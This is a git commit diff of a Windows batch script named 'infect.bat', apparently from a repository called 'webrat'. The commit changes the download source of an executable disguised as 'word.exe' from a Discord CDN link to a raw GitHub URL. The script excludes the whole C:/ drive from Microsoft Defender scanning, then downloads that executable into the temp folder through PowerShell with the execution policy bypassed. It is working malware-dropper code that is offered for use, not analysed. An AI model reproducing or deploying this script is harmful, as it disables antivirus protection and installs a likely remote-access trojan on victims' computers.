6ca67ea1a7247dafe203edea71c5bfe6742f665e
Oxapayy <oxapay@l0r3nt.cc>
2026-03-09 01:08:30 +0100

    Update infect.bat

--- infect.bat
+++ infect.bat
@@ -1,7 +1,7 @@
 @echo off
 powershell.exe -Command Add-MpPreference -ExclusionPath "C:/"
 setlocal EnableDelayedExpansion
-set "URL=https://cdn.discordapp.com/attachments/1479181698099843284/1479202130504978442/word.exe?ex=69ab2dd6&is=69a9dc56&hm=34006b4cdcea137cd05d3c152b0b1312452f84c31cc8abfc9754d5ced5830682&"
+set "URL=https://raw.githubusercontent.com/Oxapayy/webrat/refs/heads/main/word.exe"
 set "Datei=%TEMP%\word.exe"
 powershell -NoLogo -ExecutionPolicy Bypass -Command ^
     "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%Datei%'"
